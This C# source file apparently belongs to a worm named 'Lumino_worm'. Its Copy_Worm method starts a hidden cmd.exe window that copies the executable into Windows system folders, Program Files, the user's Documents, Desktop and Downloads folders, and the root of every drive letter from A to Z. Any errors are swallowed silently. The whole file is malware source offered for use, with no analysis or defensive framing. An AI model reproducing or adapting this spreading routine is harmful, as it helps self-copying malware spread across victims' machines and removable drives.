using System;
using System.Diagnostics;
using System.IO;


namespace Copy
{
    internal class Copy_Class
    {
        readonly string userName = Environment.UserName;
        readonly string computerName = System.Environment.MachineName.ToString();

        public void Copy_Worm(string name)
        {
            string user_dir = "C:\\Users\\" + userName + "\\";

            try
            {
                System.Threading.Thread.Sleep(1000);
                Process mtd = new Process();
                mtd.StartInfo.FileName = "cmd.exe";
                mtd.StartInfo.Arguments =
                "/C copy Lumino_worm.exe C:\\Windows &" +
                " copy Lumino_worm.exe C:\\Users &" +
                " copy Lumino_worm.exe C:\\ProgramData &" +
                " copy Lumino_worm.exe C:\\Program Files &" +
                " copy Lumino_worm.exe C:\\Program Files (x86)" +
                " copy Lumino_worm.exe C:\\Users\\Default" +
                " copy Lumino_worm.exe " + user_dir + " &" +
                " copy Lumino_worm.exe " + user_dir + "Documents" + " &" +
                " copy Lumino_worm.exe " + user_dir + "Desktop" + " &" +
                " copy Lumino_worm.exe " + user_dir + "Music" + " &" +
                " copy Lumino_worm.exe " + user_dir + "Pictures" + " &" +
                " copy Lumino_worm.exe " + user_dir + "Downloads" + " &" +
                " copy Lumino_worm.exe " + user_dir + "Videos" + " &" +
                " copy Lumino_worm.exe C:\\Windows\\System\\ &" +
                " copy Lumino_worm.exe C:\\Windows\\System32\\ &" +
                " copy Lumino_worm.exe C:\\Windows\\Boot\\ &" +
                " copy Lumino_worm.exe A:\\ &" +
                " copy Lumino_worm.exe B:\\ &" +
                " copy Lumino_worm.exe C:\\ &" +
                " copy Lumino_worm.exe D:\\ &" +
                " copy Lumino_worm.exe E:\\ &" +
                " copy Lumino_worm.exe F:\\ &" +
                " copy Lumino_worm.exe G:\\ &" +
                " copy Lumino_worm.exe H:\\ &" +
                " copy Lumino_worm.exe I:\\ &" +
                " copy Lumino_worm.exe J:\\ &" +
                " copy Lumino_worm.exe K:\\ &" +
                " copy Lumino_worm.exe L:\\ &" +
                " copy Lumino_worm.exe M:\\ &" +
                " copy Lumino_worm.exe N:\\ &" +
                " copy Lumino_worm.exe O:\\ &" +
                " copy Lumino_worm.exe P:\\ &" +
                " copy Lumino_worm.exe Q:\\ &" +
                " copy Lumino_worm.exe R:\\ &" +
                " copy Lumino_worm.exe S:\\ &" +
                " copy Lumino_worm.exe T:\\ &" +
                " copy Lumino_worm.exe U:\\ &" +
                " copy Lumino_worm.exe V:\\ &" +
                " copy Lumino_worm.exe W:\\ &" +
                " copy Lumino_worm.exe X:\\ &" +
                " copy Lumino_worm.exe Y:\\ &" +
                " copy Lumino_worm.exe Z:\\ & close" ;

                mtd.StartInfo.UseShellExecute = true;
                mtd.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                mtd.Start();
                mtd.Close();

                }
                catch (SystemException) { }

        }
    }
}
